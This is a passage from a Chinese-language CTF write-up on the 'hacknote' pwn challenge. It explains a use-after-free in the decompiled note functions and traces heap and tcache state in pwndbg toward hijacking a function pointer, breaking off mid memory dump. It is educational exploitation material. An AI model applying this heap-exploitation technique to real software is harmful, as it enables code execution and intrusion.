class=\"line\">      <span class=\"keyword\">if</span> ( !*(&amp;notelist + i) )</span><br><span class=\"line\">      &#123;</span><br><span class=\"line\">        *(&amp;notelist + i) = <span class=\"built_in\">malloc</span>(<span class=\"number\">8u</span>);</span><br><span class=\"line\">        <span class=\"keyword\">if</span> ( !*(&amp;notelist + i) )</span><br><span class=\"line\">        &#123;</span><br><span class=\"line\">          <span class=\"built_in\">puts</span>(<span class=\"string\">&quot;Alloca Error&quot;</span>);</span><br><span class=\"line\">          <span class=\"built_in\">exit</span>(<span class=\"number\">-1</span>);</span><br><span class=\"line\">        &#125;</span><br><span class=\"line\">        *(_DWORD *)*(&amp;notelist + i) = print_note_content;</span><br><span class=\"line\">        <span class=\"built_in\">printf</span>(<span class=\"string\">&quot;Note size :&quot;</span>);</span><br><span class=\"line\">        read(<span class=\"number\">0</span>, buf, <span class=\"number\">8u</span>);</span><br><span class=\"line\">        size = atoi(buf);</span><br><span class=\"line\">        v0 = (<span class=\"type\">int</span>)*(&amp;notelist + i);</span><br><span class=\"line\">        *(_DWORD *)(v0 + <span class=\"number\">4</span>) = <span class=\"built_in\">malloc</span>(size);</span><br><span class=\"line\">        <span class=\"keyword\">if</span> ( !*((_DWORD *)*(&amp;notelist + i) + <span class=\"number\">1</span>) )</span><br><span class=\"line\">        &#123;</span><br><span class=\"line\">          <span class=\"built_in\">puts</span>(<span class=\"string\">&quot;Alloca Error&quot;</span>);</span><br><span class=\"line\">          <span class=\"built_in\">exit</span>(<span class=\"number\">-1</span>);</span><br><span class=\"line\">        &#125;</span><br><span class=\"line\">        <span class=\"built_in\">printf</span>(<span class=\"string\">&quot;Content :&quot;</span>);</span><br><span class=\"line\">        read(<span class=\"number\">0</span>, *((<span class=\"type\">void</span> **)*(&amp;notelist + i) + <span class=\"number\">1</span>), size);</span><br><span class=\"line\">        <span class=\"built_in\">puts</span>(<span class=\"string\">&quot;Success !&quot;</span>);</span><br><span class=\"line\">        ++count;</span><br><span class=\"line\">        <span class=\"keyword\">return</span> __readgsdword(<span class=\"number\">0x14</span>u) ^ v5;</span><br><span class=\"line\">      &#125;</span><br><span class=\"line\">    &#125;</span><br><span class=\"line\">  &#125;</span><br><span class=\"line\">  <span class=\"keyword\">else</span></span><br><span class=\"line\">  &#123;</span><br><span class=\"line\">    <span class=\"built_in\">puts</span>(<span class=\"string\">&quot;Full&quot;</span>);</span><br><span class=\"line\">  &#125;</span><br><span class=\"line\">  <span class=\"keyword\">return</span> __readgsdword(<span class=\"number\">0x14</span>u) ^ v5;</span><br><span class=\"line\">&#125;</span><br></pre></td></tr></table></figure>\n<p>​\t\t先分配了一个堆空间，具体大小为数组 notelist 的单个元素的大小，之后就是让 noteliist 第一个元素指向一个函数：</p>\n<figure class=\"highlight c\"><table><tr><td class=\"gutter\"><pre><span class=\"line\">1</span><br></pre></td><td class=\"code\"><pre><span class=\"line\">*(_DWORD *)*(&amp;notelist + i) = print_note_content;</span><br></pre></td></tr></table></figure>\n<p>​\t\t估计第一个参数是一个函数指针，之后 malloc 第二个堆，地址赋给第二个参数，之后读取 size 大小的字符进入第二个堆块。</p>\n<figure class=\"highlight c\"><table><tr><td class=\"gutter\"><pre><span class=\"line\">1</span><br><span class=\"line\">2</span><br><span class=\"line\">3</span><br><span class=\"line\">4</span><br></pre></td><td class=\"code\"><pre><span class=\"line\">v0 = (<span class=\"type\">int</span>)*(&amp;notelist + i);</span><br><span class=\"line\">*(_DWORD *)(v0 + <span class=\"number\">4</span>) = <span class=\"built_in\">malloc</span>(size);</span><br><span class=\"line\"></span><br><span class=\"line\">read(<span class=\"number\">0</span>, *((<span class=\"type\">void</span> **)*(&amp;notelist + i) + <span class=\"number\">1</span>), size);</span><br></pre></td></tr></table></figure>\n<p>​\t\t删除 note：</p>\n<figure class=\"highlight c\"><table><tr><td class=\"gutter\"><pre><span class=\"line\">1</span><br><span class=\"line\">2</span><br><span class=\"line\">3</span><br><span class=\"line\">4</span><br><span class=\"line\">5</span><br><span class=\"line\">6</span><br><span class=\"line\">7</span><br><span class=\"line\">8</span><br><span class=\"line\">9</span><br><span class=\"line\">10</span><br><span class=\"line\">11</span><br><span class=\"line\">12</span><br><span class=\"line\">13</span><br><span class=\"line\">14</span><br><span class=\"line\">15</span><br><span class=\"line\">16</span><br><span class=\"line\">17</span><br><span class=\"line\">18</span><br><span class=\"line\">19</span><br><span class=\"line\">20</span><br><span class=\"line\">21</span><br><span class=\"line\">22</span><br><span class=\"line\">23</span><br></pre></td><td class=\"code\"><pre><span class=\"line\"><span class=\"type\">unsigned</span> <span class=\"type\">int</span> <span class=\"title function_\">del_note</span><span class=\"params\">()</span></span><br><span class=\"line\">&#123;</span><br><span class=\"line\">  <span class=\"type\">int</span> v1; <span class=\"comment\">// [esp+4h] [ebp-14h]</span></span><br><span class=\"line\">  <span class=\"type\">char</span> buf[<span class=\"number\">4</span>]; <span class=\"comment\">// [esp+8h] [ebp-10h] BYREF</span></span><br><span class=\"line\">  <span class=\"type\">unsigned</span> <span class=\"type\">int</span> v3; <span class=\"comment\">// [esp+Ch] [ebp-Ch]</span></span><br><span class=\"line\"></span><br><span class=\"line\">  v3 = __readgsdword(<span class=\"number\">0x14</span>u);</span><br><span class=\"line\">  <span class=\"built_in\">printf</span>(<span class=\"string\">&quot;Index :&quot;</span>);</span><br><span class=\"line\">  read(<span class=\"number\">0</span>, buf, <span class=\"number\">4u</span>);</span><br><span class=\"line\">  v1 = atoi(buf);</span><br><span class=\"line\">  <span class=\"keyword\">if</span> ( v1 &lt; <span class=\"number\">0</span> || v1 &gt;= count )</span><br><span class=\"line\">  &#123;</span><br><span class=\"line\">    <span class=\"built_in\">puts</span>(<span class=\"string\">&quot;Out of bound!&quot;</span>);</span><br><span class=\"line\">    _exit(<span class=\"number\">0</span>);</span><br><span class=\"line\">  &#125;</span><br><span class=\"line\">  <span class=\"keyword\">if</span> ( *(&amp;notelist + v1) )</span><br><span class=\"line\">  &#123;</span><br><span class=\"line\">    <span class=\"built_in\">free</span>(*((<span class=\"type\">void</span> **)*(&amp;notelist + v1) + <span class=\"number\">1</span>));</span><br><span class=\"line\">    <span class=\"built_in\">free</span>(*(&amp;notelist + v1));</span><br><span class=\"line\">    <span class=\"built_in\">puts</span>(<span class=\"string\">&quot;Success&quot;</span>);</span><br><span class=\"line\">  &#125;</span><br><span class=\"line\">  <span class=\"keyword\">return</span> __readgsdword(<span class=\"number\">0x14</span>u) ^ v3;</span><br><span class=\"line\">&#125;</span><br></pre></td></tr></table></figure>\n<p>​\t\t发现先后删除了两个堆块，一个是写入的堆块，也就是上面第二个生成的堆块，之后释放了第一个生成的堆块，也就是存放两个指针的那个堆块：</p>\n<figure class=\"highlight c\"><table><tr><td class=\"gutter\"><pre><span class=\"line\">1</span><br><span class=\"line\">2</span><br></pre></td><td class=\"code\"><pre><span class=\"line\"><span class=\"built_in\">free</span>(*((<span class=\"type\">void</span> **)*(&amp;notelist + v1) + <span class=\"number\">1</span>));</span><br><span class=\"line\"><span class=\"built_in\">free</span>(*(&amp;notelist + v1));</span><br></pre></td></tr></table></figure>\n<p>​\t\t但之后没有对指针进行置零，存在 UAF 漏洞，因为 show 里存在 idx 参数，释放后如果申请大小差不多的堆块。</p>\n<p>​\t\t之后是 print_note 函数：</p>\n<figure class=\"highlight c\"><table><tr><td class=\"gutter\"><pre><span class=\"line\">1</span><br><span class=\"line\">2</span><br><span class=\"line\">3</span><br><span class=\"line\">4</span><br><span class=\"line\">5</span><br><span class=\"line\">6</span><br><span class=\"line\">7</span><br><span class=\"line\">8</span><br><span class=\"line\">9</span><br><span class=\"line\">10</span><br><span class=\"line\">11</span><br><span class=\"line\">12</span><br><span class=\"line\">13</span><br><span class=\"line\">14</span><br><span class=\"line\">15</span><br><span class=\"line\">16</span><br><span class=\"line\">17</span><br><span class=\"line\">18</span><br><span class=\"line\">19</span><br></pre></td><td class=\"code\"><pre><span class=\"line\"><span class=\"type\">unsigned</span> <span class=\"type\">int</span> <span class=\"title function_\">print_note</span><span class=\"params\">()</span></span><br><span class=\"line\">&#123;</span><br><span class=\"line\">  <span class=\"type\">int</span> v1; <span class=\"comment\">// [esp+4h] [ebp-14h]</span></span><br><span class=\"line\">  <span class=\"type\">char</span> buf[<span class=\"number\">4</span>]; <span class=\"comment\">// [esp+8h] [ebp-10h] BYREF</span></span><br><span class=\"line\">  <span class=\"type\">unsigned</span> <span class=\"type\">int</span> v3; <span class=\"comment\">// [esp+Ch] [ebp-Ch]</span></span><br><span class=\"line\"></span><br><span class=\"line\">  v3 = __readgsdword(<span class=\"number\">0x14</span>u);</span><br><span class=\"line\">  <span class=\"built_in\">printf</span>(<span class=\"string\">&quot;Index :&quot;</span>);</span><br><span class=\"line\">  read(<span class=\"number\">0</span>, buf, <span class=\"number\">4u</span>);</span><br><span class=\"line\">  v1 = atoi(buf);</span><br><span class=\"line\">  <span class=\"keyword\">if</span> ( v1 &lt; <span class=\"number\">0</span> || v1 &gt;= count )</span><br><span class=\"line\">  &#123;</span><br><span class=\"line\">    <span class=\"built_in\">puts</span>(<span class=\"string\">&quot;Out of bound!&quot;</span>);</span><br><span class=\"line\">    _exit(<span class=\"number\">0</span>);</span><br><span class=\"line\">  &#125;</span><br><span class=\"line\">  <span class=\"keyword\">if</span> ( *(&amp;notelist + v1) )</span><br><span class=\"line\">    (*(<span class=\"type\">void</span> (__cdecl **)(_DWORD))*(&amp;notelist + v1))(*(&amp;notelist + v1));</span><br><span class=\"line\">  <span class=\"keyword\">return</span> __readgsdword(<span class=\"number\">0x14</span>u) ^ v3;</span><br><span class=\"line\">&#125;</span><br></pre></td></tr></table></figure>\n<p>​\t\t很显然，这里调用了那个堆块里的动态函数：</p>\n<figure class=\"highlight c\"><table><tr><td class=\"gutter\"><pre><span class=\"line\">1</span><br></pre></td><td class=\"code\"><pre><span class=\"line\">(*(<span class=\"type\">void</span> (__cdecl **)(_DWORD))*(&amp;notelist + v1))(*(&amp;notelist + v1));</span><br></pre></td></tr></table></figure>\n<p>​\t\t所以只需要想办法修改这里的函数指针即可 getshell。</p>\n<p>​\t\t上 gdb 调一下，先申请两个堆块，之后 ctrl+c 执行 gdb 指令看看：</p>\n<figure class=\"highlight shell\"><table><tr><td class=\"gutter\"><pre><span class=\"line\">1</span><br><span class=\"line\">2</span><br><span class=\"line\">3</span><br><span class=\"line\">4</span><br><span class=\"line\">5</span><br><span class=\"line\">6</span><br><span class=\"line\">7</span><br><span class=\"line\">8</span><br><span class=\"line\">9</span><br><span class=\"line\">10</span><br><span class=\"line\">11</span><br><span class=\"line\">12</span><br><span class=\"line\">13</span><br><span class=\"line\">14</span><br><span class=\"line\">15</span><br><span class=\"line\">16</span><br><span class=\"line\">17</span><br><span class=\"line\">18</span><br><span class=\"line\">19</span><br><span class=\"line\">20</span><br><span class=\"line\">21</span><br><span class=\"line\">22</span><br><span class=\"line\">23</span><br><span class=\"line\">24</span><br><span class=\"line\">25</span><br><span class=\"line\">26</span><br><span class=\"line\">27</span><br><span class=\"line\">28</span><br><span class=\"line\">29</span><br><span class=\"line\">30</span><br><span class=\"line\">31</span><br><span class=\"line\">32</span><br><span class=\"line\">33</span><br><span class=\"line\">34</span><br><span class=\"line\">35</span><br></pre></td><td class=\"code\"><pre><span class=\"line\"><span class=\"meta prompt_\">pwndbg&gt; </span><span class=\"language-bash\">r</span></span><br><span class=\"line\">Starting program: /mnt/c/Users/20820/Downloads/hacknote</span><br><span class=\"line\">----------------------</span><br><span class=\"line\">       HackNote</span><br><span class=\"line\">----------------------</span><br><span class=\"line\"> 1. Add note</span><br><span class=\"line\"> 2. Delete note</span><br><span class=\"line\"> 3. Print note</span><br><span class=\"line\"> 4. Exit</span><br><span class=\"line\">----------------------</span><br><span class=\"line\">Your choice :1</span><br><span class=\"line\">Note size :20</span><br><span class=\"line\">Content :aaa</span><br><span class=\"line\">Success !</span><br><span class=\"line\">----------------------</span><br><span class=\"line\">       HackNote</span><br><span class=\"line\">----------------------</span><br><span class=\"line\"> 1. Add note</span><br><span class=\"line\"> 2. Delete note</span><br><span class=\"line\"> 3. Print note</span><br><span class=\"line\"> 4. Exit</span><br><span class=\"line\">----------------------</span><br><span class=\"line\">Your choice :1</span><br><span class=\"line\">Note size :30</span><br><span class=\"line\">Content :AAA</span><br><span class=\"line\">Success !</span><br><span class=\"line\">----------------------</span><br><span class=\"line\">       HackNote</span><br><span class=\"line\">----------------------</span><br><span class=\"line\"> 1. Add note</span><br><span class=\"line\"> 2. Delete note</span><br><span class=\"line\"> 3. Print note</span><br><span class=\"line\"> 4. Exit</span><br><span class=\"line\">----------------------</span><br><span class=\"line\">Your choice :^C</span><br></pre></td></tr></table></figure>\n<p>​\t\t之后查看下 heap 状态：</p>\n<figure class=\"highlight shell\"><table><tr><td class=\"gutter\"><pre><span class=\"line\">1</span><br><span class=\"line\">2</span><br><span class=\"line\">3</span><br><span class=\"line\">4</span><br><span class=\"line\">5</span><br><span class=\"line\">6</span><br><span class=\"line\">7</span><br><span class=\"line\">8</span><br><span class=\"line\">9</span><br><span class=\"line\">10</span><br><span class=\"line\">11</span><br><span class=\"line\">12</span><br><span class=\"line\">13</span><br><span class=\"line\">14</span><br><span class=\"line\">15</span><br><span class=\"line\">16</span><br><span class=\"line\">17</span><br><span class=\"line\">18</span><br><span class=\"line\">19</span><br><span class=\"line\">20</span><br><span class=\"line\">21</span><br><span class=\"line\">22</span><br><span class=\"line\">23</span><br><span class=\"line\">24</span><br></pre></td><td class=\"code\"><pre><span class=\"line\"><span class=\"meta prompt_\">pwndbg&gt; </span><span class=\"language-bash\">heap</span></span><br><span class=\"line\">Allocated chunk | PREV_INUSE</span><br><span class=\"line\">Addr: 0x804b008</span><br><span class=\"line\">Size: 0x190 (with flag bits: 0x191)</span><br><span class=\"line\"></span><br><span class=\"line\">Allocated chunk | PREV_INUSE</span><br><span class=\"line\">Addr: 0x804b198</span><br><span class=\"line\">Size: 0x10 (with flag bits: 0x11)</span><br><span class=\"line\"></span><br><span class=\"line\">Allocated chunk | PREV_INUSE</span><br><span class=\"line\">Addr: 0x804b1a8</span><br><span class=\"line\">Size: 0x20 (with flag bits: 0x21)</span><br><span class=\"line\"></span><br><span class=\"line\">Allocated chunk | PREV_INUSE</span><br><span class=\"line\">Addr: 0x804b1c8</span><br><span class=\"line\">Size: 0x10 (with flag bits: 0x11)</span><br><span class=\"line\"></span><br><span class=\"line\">Allocated chunk | PREV_INUSE</span><br><span class=\"line\">Addr: 0x804b1d8</span><br><span class=\"line\">Size: 0x30 (with flag bits: 0x31)</span><br><span class=\"line\"></span><br><span class=\"line\">Top chunk | PREV_INUSE</span><br><span class=\"line\">Addr: 0x804b208</span><br><span class=\"line\">Size: 0x21df8 (with flag bits: 0x21df9)</span><br></pre></td></tr></table></figure>\n<p>​\t\t除开最开始的那个 size 为 0x190 的那位以外，其他的大致符合情况 ，两次都是先申请了一个堆块存放两个地址，然后申请另一个堆块来存放输入的内容，之后读一下 0x804b198 的内存：</p>\n<figure class=\"highlight shell\"><table><tr><td class=\"gutter\"><pre><span class=\"line\">1</span><br><span class=\"line\">2</span><br><span class=\"line\">3</span><br><span class=\"line\">4</span><br><span class=\"line\">5</span><br><span class=\"line\">6</span><br><span class=\"line\">7</span><br><span class=\"line\">8</span><br><span class=\"line\">9</span><br><span class=\"line\">10</span><br><span class=\"line\">11</span><br><span class=\"line\">12</span><br><span class=\"line\">13</span><br><span class=\"line\">14</span><br><span class=\"line\">15</span><br><span class=\"line\">16</span><br></pre></td><td class=\"code\"><pre><span class=\"line\"><span class=\"meta prompt_\">pwndbg&gt; </span><span class=\"language-bash\">x/30gx 0x804b198</span></span><br><span class=\"line\">0x804b198:      0x0000001100000000      0x0804b1b00804865b\t\t&lt;---这里两个数据，一个是函数指针，也就是0x0804865b，另一个就是输入地址的那个堆块的地址0x0804b1b0</span><br><span class=\"line\">0x804b1a8:      0x0000002100000000      0x000000000a616161</span><br><span class=\"line\">0x804b1b8:      0x0000000000000000      0x0000000000000000</span><br><span class=\"line\">0x804b1c8:      0x0000001100000000      0x0804b1e00804865b</span><br><span class=\"line\">0x804b1d8:      0x0000003100000000      0x000000000a414141</span><br><span class=\"line\">0x804b1e8:      0x0000000000000000      0x0000000000000000</span><br><span class=\"line\">0x804b1f8:      0x0000000000000000      0x0000000000000000</span><br><span class=\"line\">0x804b208:      0x00021df900000000      0x0000000000000000</span><br><span class=\"line\">0x804b218:      0x0000000000000000      0x0000000000000000</span><br><span class=\"line\">0x804b228:      0x0000000000000000      0x0000000000000000</span><br><span class=\"line\">0x804b238:      0x0000000000000000      0x0000000000000000</span><br><span class=\"line\">0x804b248:      0x0000000000000000      0x0000000000000000</span><br><span class=\"line\">0x804b258:      0x0000000000000000      0x0000000000000000</span><br><span class=\"line\">0x804b268:      0x0000000000000000      0x0000000000000000</span><br><span class=\"line\">0x804b278:      0x0000000000000000      0x0000000000000000</span><br></pre></td></tr></table></figure>\n<p>​\t\t这个函数在 IDA 里的地址是：</p>\n<figure class=\"highlight plaintext\"><table><tr><td class=\"gutter\"><pre><span class=\"line\">1</span><br><span class=\"line\">2</span><br><span class=\"line\">3</span><br><span class=\"line\">4</span><br><span class=\"line\">5</span><br><span class=\"line\">6</span><br><span class=\"line\">7</span><br><span class=\"line\">8</span><br><span class=\"line\">9</span><br><span class=\"line\">10</span><br><span class=\"line\">11</span><br><span class=\"line\">12</span><br><span class=\"line\">13</span><br><span class=\"line\">14</span><br><span class=\"line\">15</span><br><span class=\"line\">16</span><br><span class=\"line\">17</span><br><span class=\"line\">18</span><br><span class=\"line\">19</span><br></pre></td><td class=\"code\"><pre><span class=\"line\">.text:0804865B print_note_content proc near            ; DATA XREF: add_note+9A↓o</span><br><span class=\"line\">.text:0804865B</span><br><span class=\"line\">.text:0804865B arg_0           = dword ptr  8</span><br><span class=\"line\">.text:0804865B</span><br><span class=\"line\">.text:0804865B ; __unwind &#123;</span><br><span class=\"line\">.text:0804865B                 push    ebp</span><br><span class=\"line\">.text:0804865C                 mov     ebp, esp</span><br><span class=\"line\">.text:0804865E                 sub     esp, 8</span><br><span class=\"line\">.text:08048661                 mov     eax, [ebp+arg_0]</span><br><span class=\"line\">.text:08048664                 mov     eax, [eax+4]</span><br><span class=\"line\">.text:08048667                 sub     esp, 0Ch</span><br><span class=\"line\">.text:0804866A                 push    eax             ; s</span><br><span class=\"line\">.text:0804866B                 call    _puts</span><br><span class=\"line\">.text:08048670                 add     esp, 10h</span><br><span class=\"line\">.text:08048673                 nop</span><br><span class=\"line\">.text:08048674                 leave</span><br><span class=\"line\">.text:08048675                 retn</span><br><span class=\"line\">.text:08048675 ; &#125; // starts at 804865B</span><br><span class=\"line\">.text:08048675 print_note_content endp</span><br></pre></td></tr></table></figure>\n<p>​\t\t此时 bins 里啥都没有：</p>\n<figure class=\"highlight plaintext\"><table><tr><td class=\"gutter\"><pre><span class=\"line\">1</span><br><span class=\"line\">2</span><br><span class=\"line\">3</span><br><span class=\"line\">4</span><br><span class=\"line\">5</span><br><span class=\"line\">6</span><br><span class=\"line\">7</span><br><span class=\"line\">8</span><br><span class=\"line\">9</span><br><span class=\"line\">10</span><br><span class=\"line\">11</span><br></pre></td><td class=\"code\"><pre><span class=\"line\">pwndbg&gt; bins</span><br><span class=\"line\">tcachebins</span><br><span class=\"line\">empty</span><br><span class=\"line\">fastbins</span><br><span class=\"line\">empty</span><br><span class=\"line\">unsortedbin</span><br><span class=\"line\">empty</span><br><span class=\"line\">smallbins</span><br><span class=\"line\">empty</span><br><span class=\"line\">largebins</span><br><span class=\"line\">empty</span><br></pre></td></tr></table></figure>\n<p>​\t\t之后，我们分别释放掉两个堆，发现 heap 变了：</p>\n<figure class=\"highlight shell\"><table><tr><td class=\"gutter\"><pre><span class=\"line\">1</span><br><span class=\"line\">2</span><br><span class=\"line\">3</span><br><span class=\"line\">4</span><br><span class=\"line\">5</span><br><span class=\"line\">6</span><br><span class=\"line\">7</span><br><span class=\"line\">8</span><br><span class=\"line\">9</span><br><span class=\"line\">10</span><br><span class=\"line\">11</span><br><span class=\"line\">12</span><br><span class=\"line\">13</span><br><span class=\"line\">14</span><br><span class=\"line\">15</span><br><span class=\"line\">16</span><br><span class=\"line\">17</span><br><span class=\"line\">18</span><br><span class=\"line\">19</span><br><span class=\"line\">20</span><br><span class=\"line\">21</span><br><span class=\"line\">22</span><br><span class=\"line\">23</span><br><span class=\"line\">24</span><br><span class=\"line\">25</span><br><span class=\"line\">26</span><br><span class=\"line\">27</span><br><span class=\"line\">28</span><br></pre></td><td class=\"code\"><pre><span class=\"line\"><span class=\"meta prompt_\">pwndbg&gt; </span><span class=\"language-bash\">heap</span></span><br><span class=\"line\">Allocated chunk | PREV_INUSE</span><br><span class=\"line\">Addr: 0x804b008</span><br><span class=\"line\">Size: 0x190 (with flag bits: 0x191)</span><br><span class=\"line\"></span><br><span class=\"line\">Free chunk (tcachebins) | PREV_INUSE</span><br><span class=\"line\">Addr: 0x804b198</span><br><span class=\"line\">Size: 0x10 (with flag bits: 0x11)</span><br><span class=\"line\">fd: 0x00</span><br><span class=\"line\"></span><br><span class=\"line\">Free chunk (tcachebins) | PREV_INUSE</span><br><span class=\"line\">Addr: 0x804b1a8</span><br><span class=\"line\">Size: 0x20 (with flag bits: 0x21)</span><br><span class=\"line\">fd: 0x00</span><br><span class=\"line\"></span><br><span class=\"line\">Free chunk (tcachebins) | PREV_INUSE</span><br><span class=\"line\">Addr: 0x804b1c8</span><br><span class=\"line\">Size: 0x10 (with flag bits: 0x11)</span><br><span class=\"line\">fd: 0x804b1a0</span><br><span class=\"line\"></span><br><span class=\"line\">Free chunk (tcachebins) | PREV_INUSE</span><br><span class=\"line\">Addr: 0x804b1d8</span><br><span class=\"line\">Size: 0x30 (with flag bits: 0x31)</span><br><span class=\"line\">fd: 0x00</span><br><span class=\"line\"></span><br><span class=\"line\">Top chunk | PREV_INUSE</span><br><span class=\"line\">Addr: 0x804b208</span><br><span class=\"line\">Size: 0x21df8 (with flag bits: 0x21df9)</span><br></pre></td></tr></table></figure>\n<p>​\t\t释放掉了之后，读取 0x804b198 的内容：</p>\n<figure class=\"highlight shell\"><table><tr><td class=\"gutter\"><pre><span class=\"line\">1</span><br><span class=\"line\">2</span><br><span class=\"line\">3</span><br><span class=\"line\">4</span><br><span class=\"line\">5</span><br><span class=\"line\">6</span><br><span class=\"line\">7</span><br><span class=\"line\">8</span><br><span class=\"line\">9</span><br><span class=\"line\">10</span><br><span class=\"line\">11</span><br><span class=\"line\">12</span><br><span class=\"line\">13</span><br><span class=\"line\">14</span><br><span class=\"line\">15</span><br><span class=\"line\">16</span><br></pre></td><td class=\"code\"><pre><span class=\"line\"><span class=\"meta prompt_\">pwndbg&gt; </span><span class=\"language-bash\">x/30gx 0x804b198</span></span><br><span class=\"line\">0x804b198:      0x0000001100000000      0x0804b01000000000</span><br><span class=\"line\">0x804b1a8:      0x0000002100000000      0x0804b01000000000</span><br><span class=\"line\">0x804b1b8:      0x0000000000000000      0x0000000000000000</span><br><span class=\"line\">0x804b1c8:      0x0000001100000000      0x0804b0100804b1a0</span><br><span class=\"line\">0x804b1d8:      0x0000003100000000      0x0804b01000000000</span><br><span class=\"line\">0x804b1e8:      0x0000000000000000      0x0000000000000000</span><br><span class=\"line\">0x804b1f8:      0x0000000000000000      0x0000000000000000</span><br><span class=\"line\">0x804b208:      0x00021df900000000      0x0000000000000000</span><br><span class=\"line\">0x804b218:      0x0000000000000000      0x0000000000000000</span><br><span class=\"line\">0x804b228:      0x0000000000000000      0x0000000000000000</span><br><span class=\"line\">0x804b238:      0x0000000000000000      0x0000000000000000</span><br><span class=\"line\">0x804b248:      0x0000000000000000      0x0000000000000000</span><br><span class=\"line\">0x804b258:      0x0000000000000000      0x0000000000000000</span><br><span class=\"line\">0x804b268:      0x0000000000000000      0x0000000000000000</span><br><span class=\"line\">0x804b278:      0x0000000000000000      0x0000000000000000</span><br></pre></td></tr></table></figure>\n<p>​\t\t再看看这个：</p>\n<figure class=\"highlight shell\"><table><tr><td class=\"gutter\"><pre><span class=\"line\">1</span><br><span class=\"line\">2</span><br><span class=\"line\">3</span><br><span class=\"line\">4</span><br><span class=\"line\">5</span><br><span class=\"line\">6</span><br><span class=\"line\">7</span><br><span class=\"line\">8</span><br><span class=\"line\">9</span><br><span class=\"line\">10</span><br><span class=\"line\">11</span><br><span class=\"line\">12</span><br><span class=\"line\">13</span><br></pre></td><td class=\"code\"><pre><span class=\"line\"><span class=\"meta prompt_\">pwndbg&gt; </span><span class=\"language-bash\">bins</span></span><br><span class=\"line\">tcachebins</span><br><span class=\"line\">0x10 [  2]: 0x804b1d0 —▸ 0x804b1a0 ◂— 0</span><br><span class=\"line\">0x20 [  1]: 0x804b1b0 ◂— 0</span><br><span class=\"line\">0x30 [  1]: 0x804b1e0 ◂— 0</span><br><span class=\"line\">fastbins</span><br><span class=\"line\">empty</span><br><span class=\"line\">unsortedbin</span><br><span class=\"line\">empty</span><br><span class=\"line\">smallbins</span><br><span class=\"line\">empty</span><br><span class=\"line\">largebins</span><br><span class=\"line\">empty</span><br></pre></td></tr></table></figure>\n<p>​\t\t完蛋，没注意到 tcache 给我保存了这些内容，不过不清楚是否存在影响，继续调一调看看吧，之后重新申请个堆</p>\n<figure class=\"highlight shell\"><table><tr><td class=\"gutter\"><pre><span class=\"line\">1</span><br><span class=\"line\">2</span><br><span class=\"line\">3</span><br><span class=\"line\">4</span><br><span class=\"line\">5</span><br><span class=\"line\">6</span><br><span class=\"line\">7</span><br><span class=\"line\">8</span><br><span class=\"line\">9</span><br><span class=\"line\">10</span><br><span class=\"line\">11</span><br><span class=\"line\">12</span><br><span class=\"line\">13</span><br><span class=\"line\">14</span><br><span class=\"line\">15</span><br></pre></td><td class=\"code\"><pre><span class=\"line\"><span class=\"meta prompt_\">pwndbg&gt; </span><span class=\"language-bash\">c</span></span><br><span class=\"line\">Continuing.</span><br><span class=\"line\">1</span><br><span class=\"line\">Note size :8</span><br><span class=\"line\">Content :aaaa</span><br><span class=\"line\">Success !</span><br><span class=\"line\">----------------------</span><br><span class=\"line\">       HackNote</span><br><span class=\"line\">----------------------</span><br><span class=\"line\"> 1. Add note</span><br><span class=\"line\"> 2. Delete note</span><br><span class=\"line\"> 3. Print note</span><br><span class=\"line\"> 4. Exit</span><br><span class=\"line\">----------------------</span><br><span class=\"line\">Your choice :^C</span><br></pre></td></tr></table></figure>\n<p>​\t\t之后再看看 heap：</p>\n<figure class=\"highlight shell\"><table><tr><td class=\"gutter\"><pre><span class=\"line\">1</span><br><span class=\"line\">2</span><br><span class=\"line\">3</span><br><span class=\"line\">4</span><br><span class=\"line\">5</span><br><span class=\"line\">6</span><br><span class=\"line\">7</span><br><span class=\"line\">8</span><br><span class=\"line\">9</span><br><span class=\"line\">10</span><br><span class=\"line\">11</span><br><span class=\"line\">12</span><br><span class=\"line\">13</span><br><span class=\"line\">14</span><br><span class=\"line\">15</span><br><span class=\"line\">16</span><br><span class=\"line\">17</span><br><span class=\"line\">18</span><br><span class=\"line\">19</span><br><span class=\"line\">20</span><br><span class=\"line\">21</span><br><span class=\"line\">22</span><br><span class=\"line\">23</span><br><span class=\"line\">24</span><br><span class=\"line\">25</span><br><span class=\"line\">26</span><br></pre></td><td class=\"code\"><pre><span class=\"line\"><span class=\"meta prompt_\">pwndbg&gt; </span><span class=\"language-bash\">heap</span></span><br><span class=\"line\">Allocated chunk | PREV_INUSE</span><br><span class=\"line\">Addr: 0x804b008</span><br><span class=\"line\">Size: 0x190 (with flag bits: 0x191)</span><br><span class=\"line\"></span><br><span class=\"line\">Allocated chunk | PREV_INUSE</span><br><span class=\"line\">Addr: 0x804b198</span><br><span class=\"line\">Size: 0x10 (with flag bits: 0x11)</span><br><span class=\"line\"></span><br><span class=\"line\">Free chunk (tcachebins) | PREV_INUSE</span><br><span class=\"line\">Addr: 0x804b1a8</span><br><span class=\"line\">Size: 0x20 (with flag bits: 0x21)</span><br><span class=\"line\">fd: 0x00</span><br><span class=\"line\"></span><br><span class=\"line\">Allocated chunk | PREV_INUSE</span><br><span class=\"line\">Addr: 0x804b1c8</span><br><span class=\"line\">Size: 0x10 (with flag bits: 0x11)</span><br><span class=\"line\"></span><br><span class=\"line\">Free chunk (tcachebins) | PREV_INUSE</span><br><span class=\"line\">Addr: 0x804b1d8</span><br><span class=\"line\">Size: 0x30 (with flag bits: 0x31)</span><br><span class=\"line\">fd: 0x00</span><br><span class=\"line\"></span><br><span class=\"line\">Top chunk | PREV_INUSE</span><br><span class=\"line\">Addr: 0x804b208</span><br><span class=\"line\">Size: 0x21df8 (with flag bits: 0x21df9)</span><br></pre></td></tr></table></figure>\n<p>​\t\t0x804b198 这个地址的 chunk 被重新拿去用了，第二次申请的那个原本存放了函数指针和字符串指针的那个 chunk 被分配了，之前拿去作为存放内容的那两个 chunk 一个都没有被分配，之后读一下这个地址：</p>\n<figure class=\"highlight shell\"><table><tr><td class=\"gutter\"><pre><span class=\"line\">1</span><br><span class=\"line\">2</span><br><span class=\"line\">3</span><br><span class=\"line\">4</span><br><span class=\"line\">5</span><br><span class=\"line\">6</span><br><span class=\"line\">7</span><br><span class=\"line\">8</span><br><span class=\"line\">9</span><br><span class=\"line\">10</span><br><span class=\"line\">11</span><br><span class=\"line\">12</span><br><span class=\"line\">13</span><br><span class=\"line\">14</span><br><span class=\"line\">15</span><br><span class=\"line\">16</span><br></pre></td><td class=\"code\"><pre><span class=\"line\"><span class=\"meta prompt_\">pwndbg&gt; </span><span class=\"language-bash\">x/30xg 0x804b198</span></span><br><span class=\"line\">0x804b198:      0x0000001100000000      0x0000000a61616161</span><br><span 